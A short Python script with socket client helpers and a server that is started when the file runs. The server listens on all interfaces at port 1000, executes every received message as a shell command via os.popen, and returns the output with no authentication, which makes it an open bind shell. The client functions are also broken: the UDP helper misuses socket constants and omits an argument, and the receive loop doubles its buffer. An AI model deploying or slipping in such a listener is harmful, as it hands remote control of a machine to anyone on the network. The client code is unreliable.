#!python
import os
import socket
import sys


def tcpSocket(ip, port, massage):
    socker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return socketClient(ip, port, massage, socker)

def udpsocket(ip, port, massage):
    socker = socket.socket(socket.AddressFamily, socket.socketpair)
    return socketClient(ip, port, massage)



def socketClient(ip, port, massage, socketer):

    socketer.connect((ip, int(port) ))
    socketer.send(massage)
    while True:
        buff = socketer.recv(56656)
        if not buff:
            socketer.close()
            break
        buff += buff
    return buff



def serverSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 1000))
    sock.listen(5)
    while True:
        try:
            conn, addr = sock.accept()
            ret = conn.recv(2048)
            result = os.popen(ret).read()
            conn.send(result)
        except KeyboardInterrupt:
            sys.exit(0)

    sock.close()

if __name__ == '__main__':
    serverSocket()

